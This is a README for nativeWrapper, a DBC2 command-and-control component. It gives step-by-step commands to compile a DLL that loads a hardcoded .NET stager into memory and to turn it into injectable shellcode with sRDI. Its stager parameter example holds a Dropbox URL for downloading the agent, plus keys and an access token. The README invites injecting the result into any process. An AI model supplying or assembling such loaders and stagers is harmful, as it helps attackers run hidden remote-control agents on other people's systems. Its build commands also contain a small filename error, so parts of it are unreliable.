nativeWrapper
============
**dbc2LoaderWrapperCLR** is a unamanaged DLL that loads the .Net CLR in memory at runtime, then loads the dbc2Loader .Net assembly from memory and finally invoke a dbc2Loader specific method (*to match a specific function prototype required by InvokeMember_3 method*).

The dbc2Loader assembly is hardcoded as an array of bytes in the `dbc2LoaderWrapperCLR.h` file.

The sole purpose of this DLL is to get a unmanaged DLL hosting the dbc2Loader .Net assembly in order to be later converted into position independant shellcode through the use of sRDI (https://github.com/monoxgas/sRDI).


How to compile the nativeWrapper DLL
----------------
You'll need Visual Studio (express is ok as well):

```
====== x86 (32 bits) DLL:
	1/ First, run the following bat file:
		"c:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\bin\vcvars32.bat"

	2/ Then compile it using
		c:\> cl.exe /LD dbc2LoaderWrapperCLR.cpp /o release_x86\dbc2LoaderWrapperCLR_x86.dll
	
====== x64 (64 bits) DLL:
		1/ First, run the following bat file:
		"C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\bin\x86_amd64\vcvarsx86_amd64.bat"

	2/ Then compile it using
		c:\> cl.exe /LD dbc2LoaderWrapperCLR.cpp /o release_x64\dbc2LoaderWrapperCLR_x64.dll
```

How to convert the DLL to shellcode with sRDI
----------------

You'll have to use a slightly modified version of the powershell `ConvertTo-Shellcode.ps1` script that is provided in this repository. You'll need the x86 and/or x64 compiled nativeWrapper.dll file.

Then use the powershell script like this:

```
c:\> powershell.exe
PS c:\> ipmo ConvertTo-Shellcode.ps1

PS c:\> #x86 DLL 
PS c:\> ConvertTo-Shellcode -File release_x86\dbc2LoaderWrapperCLR_86.dll -UserData "<all required parameters for the dbc2Loader entryPoint function>" | Set-Content -Path dbc2LoaderWrapperCLR_x86.bin -Encoding Byte

PS c:\> #x64 DLL 
PS c:\> ConvertTo-Shellcode -File release_x64\dbc2LoaderWrapperCLR_64.dll -UserData "<all required parameters for the dbc2Loader entryPoint function>" | Set-Content -Path dbc2LoaderWrapperCLR_x86.bin -Encoding Byte
```

**IMPORTANT**: Using the ConvertTo-Shellcode.ps1 script, it is important to note that the dbc2Loader parameters must be passed in one single string with a `!` separator, like for instance:
`https://dropbox.com/path_to_dbc2_agent!xorkey!accessToken!masterkey`
Those parameters are just like to one you would find in any other DBC2 stager.

The resulting bin file are the shellcode that you're free to inject in any process using your prefered method.

Have fun !

Credits
-------------
Lee Christensen for creating and hosting the CLR in native code, then loading and executing a .Net assembly
https://github.com/leechristensen/UnmanagedPowerShell

Nick Landers for sRDI, used for transforming a native DLL to position independant shellcode 
https://github.com/monoxgas/sRDI